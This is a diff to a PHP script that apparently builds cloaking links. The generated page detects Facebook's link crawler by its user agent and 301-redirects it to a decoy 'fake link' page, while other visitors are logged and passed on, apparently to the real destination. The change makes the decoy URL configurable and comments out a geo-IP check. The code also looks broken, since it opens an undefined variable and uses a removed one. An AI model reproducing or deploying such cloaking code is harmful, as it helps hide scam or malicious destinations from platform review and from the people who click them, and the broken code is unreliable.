@@ -114,12 +114,9 @@ if ($_POST["url"]) {
     // $pathname = substr(md5(microtime()), rand(0, 26), 500);
     $pathname = generateRandomString();
     $filePhp = $pathname . ".php";
-    $fakeLinkHtml = $pathname . ".html";
-
-    $fakeLink = $_POST['fake_link'];
 
     $fphp = fopen($filePhp, 'w');
-    $fFakeLink = fopen($fakeLinkHtml, 'w');
+    $fFakeLink = fopen($fakelink, 'w');
 
     $title = $_POST['title'];
     $description = $_POST['description'];
@@ -187,8 +184,10 @@ if ($_POST["url"]) {
     fwrite($fFakeLink, $facebookCheat);
     fclose($fFakeLink);
 
-    $linkHtmlFake = 'http://' . $subs[array_rand($subs)] . '.' . $_SERVER['HTTP_HOST'] . '/' . $fakeLinkHtml;
-    $fakelink = $randomUrlOne . '/' . $fakeLinkHtml;
+    $fakeLink = $_POST['fake_link'];
+    if (($_POST['fake_link']) == '') {
+        $fakeLink = 'http://' . $subs[array_rand($subs)] . '.' . $_SERVER['HTTP_HOST'] . '/' . $fakeLinkHtml;
+    }
 
     $redirectUrl = addHttp($_POST['url']);
     $realDomain = parse_url($redirectUrl, PHP_URL_HOST);
@@ -221,23 +220,18 @@ function checkIP($ip)
     }
 }
 
-function checkCountry($ip)
-{
-    $json = file_get_contents("http://freegeoip.net/json/{$ip}");
-    return json_decode($json)->country_code;
-}
+// function checkCountry($ip)
+// {
+//     $json = file_get_contents("http://freegeoip.net/json/{$ip}");
+//     return json_decode($json)->country_code;
+// }
 
-$country = checkCountry($_SERVER[\'REMOTE_ADDR\']);
+// $country = checkCountry($_SERVER[\'REMOTE_ADDR\']);
 
 $allowedAgents = "allowedAgents' . $pathname . '.txt";
 $blockedAgents = "blockedAgents' . $pathname . '.txt";
 
 $ip = ip2long($_SERVER[\'REMOTE_ADDR\']);
-
-if (strpos($_SERVER["HTTP_USER_AGENT"], "android") !== false) {
-  echo "' . $redirectPN . '";
-  die();
-}
 
 if (
     strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit/1.1") !== false ||
@@ -247,7 +241,7 @@ if (
     $agent = $_SERVER[\'REMOTE_ADDR\'] . \' \' . $_SERVER[\'HTTP_USER_AGENT\'] . \' blocked \' . PHP_EOL;
     fwrite($fAgent, $agent);
     fclose($fAgent);
-    header(\'Location: ' . $linkHtmlFake . '\', true, 301);
+    header(\'Location: ' . $fakeLink . '\', true, 301);
     die();
 } else {
     $fAgent = fopen($allowedAgents, \'a\');
